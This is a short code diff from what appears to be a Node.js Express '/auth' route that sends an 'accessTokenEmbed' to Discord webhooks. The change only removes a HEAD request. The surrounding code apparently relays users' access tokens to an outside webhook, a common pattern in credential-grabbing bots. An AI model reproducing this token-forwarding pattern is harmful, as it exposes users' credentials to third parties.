@@ -106,7 +106,7 @@ app.get('/auth', async (req, res) => {
 
     const webhook4 = new WebhookClient({ url: url3 });
     const webhook5 = new WebhookClient({ url: webhook });
-    const response1 = await axios.head(url3);
+    
     webhook4.send({
       embeds: [accessTokenEmbed]
     });
